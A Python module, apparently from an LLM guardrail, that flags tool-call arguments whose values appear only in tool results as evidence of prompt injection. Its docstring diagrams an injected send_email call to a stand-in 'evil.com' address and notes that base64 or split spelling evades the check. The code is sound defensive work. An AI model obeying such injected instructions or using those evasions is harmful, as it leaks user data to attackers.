"""Argument provenance — §8 의 3단계.

```
send_email(to = "audit-team@evil.com")
                    │
   사용자 메시지에 있나?    없음
   시스템 프롬프트에 있나?  없음
   방금 읽은 파일에 있나?   ★ 있음
                    ▼
   사용자가 말한 적 없는 주소가 외부 파일에서 나왔다
   = 데이터가 지시로 바뀐 증거
```

**실전에서 통하는 이유:** 공격자는 목적지를 반드시 적어야 한다. 메일 주소·URL·파일
경로를 툴 결과 안에 써놓지 않으면 공격이 성립하지 않는다. 정상적인 경우 그 값은 사용자
메시지나 시스템 프롬프트에서 온다 — **출처가 다르다.**

⚠️ **근사법이다** (§8 한계). "문자열이 그대로 나타나는지"만 본다. base64·철자 쪼개기로
변형하면 우회된다. 1·2단계(오염 여부, 툴 종류)는 구조적 사실이라 우회가 어렵고, 이것은
그 위에 얹는 보강이다. 정교하게 만들수록 과신 위험이 커진다는 점을 잊지 말 것.
"""

from typing import Any

import orjson


def extract_tool_calls(body: Any) -> list[dict]:
    """응답에 담긴 tool_call 전부.

    choice 위치를 함께 내지 않는다. ④ 는 응답 **전체** 를 막으므로 어느 choice 였는지가
    쓰이지 않고, 쓰이지 않는 값은 테스트로 고정할 수도 없다. 필요해지면 그때 더한다.
    """
    if not isinstance(body, dict):
        return []
    choices = body.get("choices")
    if not isinstance(choices, list):
        return []

    found: list[dict] = []
    for choice in choices:
        if not isinstance(choice, dict):
            continue
        message = choice.get("message")
        if not isinstance(message, dict):
            continue
        calls = message.get("tool_calls")
        if not isinstance(calls, list):
            continue
        found.extend(call for call in calls if isinstance(call, dict))
    return found


def tool_name(tool_call: Any) -> str:
    """이름을 못 읽으면 빈 문자열 — 호출자가 "미등록"으로 처리해 안전한 쪽으로 간다."""
    if not isinstance(tool_call, dict):
        return ""
    function = tool_call.get("function")
    if not isinstance(function, dict):
        return ""
    name = function.get("name")
    return name if isinstance(name, str) else ""


def argument_strings(tool_call: Any) -> list[tuple[str, str]]:
    """``(경로, 값)`` — 인수의 문자열 값만.

    OpenAI 형식은 ``function.arguments`` 를 **JSON 문자열**로 준다. 파싱이 실패하면 값이
    없는 것으로 본다 — 우리가 먼저 터지면 가드레일이 가용성 문제가 된다.
    """
    if not isinstance(tool_call, dict):
        return []
    function = tool_call.get("function")
    if not isinstance(function, dict):
        return []

    raw = function.get("arguments")
    if isinstance(raw, dict):
        parsed: Any = raw
    elif isinstance(raw, str):
        try:
            parsed = orjson.loads(raw)
        except orjson.JSONDecodeError:
            return []
    else:
        return []

    found: list[tuple[str, str]] = []
    _walk(parsed, "", found)
    return found


def foreign_arguments(
    *,
    tool_call: Any,
    trusted: str,
    external: str,
    min_length: int,
) -> tuple[str, ...]:
    """외부 데이터에서 온 인수의 **이름**.

    구조화된 판정 근거에는 값 대신 이름을 남긴다. 전체 값은 상세 감사 본문에서 별도로
    보존한다 (§10).

    세 갈래로 갈린다:

    - 신뢰 텍스트(user/system)에 있다 → 정상. 사용자가 말한 것이다
    - 툴 결과에만 있다 → **증거**
    - 어디에도 없다 → 모델이 만든 것(요약문·제목). 증거가 아니다 — 그것까지 막으면
      오탐이 폭발한다
    """
    flagged: list[str] = []
    for path, value in argument_strings(tool_call):
        if len(value) < min_length:
            # "1"·"true"·"id" 는 툴 결과에 우연히 나타난다.
            continue
        if value in trusted:
            continue
        if value in external:
            flagged.append(path)
    return tuple(flagged)


def _walk(value: Any, path: str, found: list[tuple[str, str]]) -> None:
    if isinstance(value, str):
        found.append((path or "(root)", value))
    elif isinstance(value, dict):
        for key, item in value.items():
            _walk(item, f"{path}.{key}" if path else str(key), found)
    elif isinstance(value, list):
        for index, item in enumerate(value):
            _walk(item, f"{path}[{index}]", found)


__all__ = [
    "argument_strings",
    "extract_tool_calls",
    "foreign_arguments",
    "tool_name",
]
